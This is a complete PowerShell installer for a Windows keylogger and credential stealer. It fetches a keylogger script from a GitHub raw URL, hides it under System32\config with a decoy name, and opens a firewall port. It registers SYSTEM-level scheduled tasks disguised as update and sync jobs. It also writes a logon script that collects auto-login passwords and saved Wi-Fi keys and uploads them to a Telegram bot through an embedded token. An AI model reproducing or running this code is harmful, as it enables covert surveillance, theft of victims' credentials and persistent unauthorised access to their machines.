# Install keylogger as persistent Windows scheduled task
$TelegramBotToken = "7461592658:AAEJvcK6WH3-VnM2kXXBPtDRf8SoHinR98w"
$TelegramChatId = "1587027869"

# Find/install Python
$py = $null
$pyw = $null
$paths = @("C:\Program Files\Python311","C:\Program Files\Python312","C:\Python311","C:\Python312")
foreach ($p in $paths) {
    if (Test-Path "$p\pythonw.exe") {
        $py = "$p\python.exe"
        $pyw = "$p\pythonw.exe"
        break
    }
}

if (-not $py) {
    $installer = "$env:TEMP\python-installer.exe"
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile $installer -UseBasicParsing
    Start-Process $installer -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1","Include_pip=1" -Wait
    Remove-Item $installer
    Start-Sleep 5
    $py = "C:\Program Files\Python311\python.exe"
    $pyw = "C:\Program Files\Python311\pythonw.exe"
}

& $py -m pip install keyboard flask flask-socketio --quiet 2>$null

# Download keylogger to system location
$keyloggerPath = "C:\Windows\System32\config\svcupdate.py"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Zhuss1/main/main/keylogger-working.py" -OutFile $keyloggerPath -UseBasicParsing

# Add firewall rule
netsh advfirewall firewall add rule name="SystemUpdate" dir=in action=allow protocol=TCP localport=8081 2>$null | Out-Null

# Create scheduled task to run at startup as SYSTEM
$action = New-ScheduledTaskAction -Execute $pyw -Argument $keyloggerPath
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)

Register-ScheduledTask -TaskName "SystemUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

# Start the task immediately
Start-ScheduledTask -TaskName "SystemUpdateCheck"

# Create logon script to send credentials
$logonScriptPath = "C:\Windows\System32\config\logondata.ps1"
$logonScript = @"
`$TelegramBotToken = "$TelegramBotToken"
`$TelegramChatId = "$TelegramChatId"

`$credsOutput = @()
`$credsOutput += "=== LOGIN EVENT ==="
`$credsOutput += "Time: `$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
`$credsOutput += "Computer: `$env:COMPUTERNAME"
`$credsOutput += "User: `$env:USERNAME"
`$credsOutput += "Domain: `$env:USERDOMAIN"
`$credsOutput += ""

`$credsOutput += "=== AUTO-LOGIN CREDENTIALS ==="
try {
    `$winlogon = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    `$autoLogin = Get-ItemProperty -Path `$winlogon -ErrorAction SilentlyContinue
    if (`$autoLogin.AutoAdminLogon -eq "1") {
        `$credsOutput += "Username: `$(`$autoLogin.DefaultUsername)"
        `$credsOutput += "Password: `$(`$autoLogin.DefaultPassword)"
    }
} catch {}

`$credsOutput += ""
`$credsOutput += "=== WIFI PASSWORDS ==="
try {
    `$wifiProfiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { (`$_ -split ":")[-1].Trim() }
    foreach (`$wifiProfile in `$wifiProfiles) {
        `$passInfo = netsh wlan show profile name="`$wifiProfile" key=clear
        `$wifiPassword = (`$passInfo | Select-String "Key Content") -replace ".*: ",""
        if (`$wifiPassword) { `$credsOutput += "`$wifiProfile : `$wifiPassword" }
    }
} catch {}

`$credsFile = "`$env:TEMP\login-`$env:COMPUTERNAME-`$(Get-Date -Format 'yyyyMMdd-HHmmss').txt"
`$credsOutput | Out-File -FilePath `$credsFile -Encoding UTF8

Add-Type -AssemblyName System.Net.Http
`$httpClient = New-Object System.Net.Http.HttpClient
`$form = New-Object System.Net.Http.MultipartFormDataContent
`$form.Add((New-Object System.Net.Http.StringContent(`$TelegramChatId)), "chat_id")
`$form.Add((New-Object System.Net.Http.StringContent("Login: `$env:USERNAME @ `$env:COMPUTERNAME")), "caption")
`$fileStream = [System.IO.File]::OpenRead(`$credsFile)
`$fileContent = New-Object System.Net.Http.StreamContent(`$fileStream)
`$form.Add(`$fileContent, "document", [System.IO.Path]::GetFileName(`$credsFile))

try {
    `$response = `$httpClient.PostAsync("https://api.telegram.org/bot`$TelegramBotToken/sendDocument", `$form).Result
} catch {}

if (`$fileStream) { `$fileStream.Dispose() }
if (`$httpClient) { `$httpClient.Dispose() }
Remove-Item `$credsFile -Force -ErrorAction SilentlyContinue
"@

$logonScript | Out-File -FilePath $logonScriptPath -Encoding UTF8

# Create scheduled task to run logon script when ANY user logs in
$logonAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $logonScriptPath"
$logonTrigger = New-ScheduledTaskTrigger -AtLogOn
$logonPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$logonSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName "UserDataSync" -Action $logonAction -Trigger $logonTrigger -Principal $logonPrincipal -Settings $logonSettings -Force

Write-Output "Installed as persistent service. Keylogger will survive logouts and restarts."
